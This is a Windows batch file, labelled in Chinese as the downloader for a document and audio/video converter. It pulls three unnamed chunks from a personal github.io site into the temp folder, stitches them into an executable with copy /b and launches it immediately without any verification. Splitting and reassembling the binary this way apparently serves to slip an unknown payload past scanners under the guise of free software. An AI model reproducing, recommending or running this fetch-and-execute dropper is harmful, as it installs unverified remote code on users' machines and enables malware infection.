@echo off
setlocal
title 文档与音视频转换工具 - 下载器
set "BASE=https://hefulong1017.github.io/software"
set "DIR=%TEMP%\IXHY609-converter"
if not exist "%DIR%" mkdir "%DIR%"

echo.
echo   文档与音视频转换工具-IXHY609
echo   文件较大，分 3 卷下载，约 270 MB。
echo.

echo [1/3] 下载第 1 卷...
curl.exe -L --fail --retry 3 --progress-bar -o "%DIR%\part1" "%BASE%/converter.part1"
if errorlevel 1 goto failed

echo [2/3] 下载第 2 卷...
curl.exe -L --fail --retry 3 --progress-bar -o "%DIR%\part2" "%BASE%/converter.part2"
if errorlevel 1 goto failed

echo [3/3] 下载第 3 卷...
curl.exe -L --fail --retry 3 --progress-bar -o "%DIR%\part3" "%BASE%/converter.part3"
if errorlevel 1 goto failed

echo.
echo 正在合并...
copy /b /y "%DIR%\part1"+"%DIR%\part2"+"%DIR%\part3" "%DIR%\DocumentConverter-IXHY609.exe" >nul
if errorlevel 1 goto failed

echo 启动程序...
start "" "%DIR%\DocumentConverter-IXHY609.exe"
exit /b 0

:failed
echo.
echo 下载或合并失败。请检查网络后重试，或手动下载 3 个分卷。
pause
exit /b 1
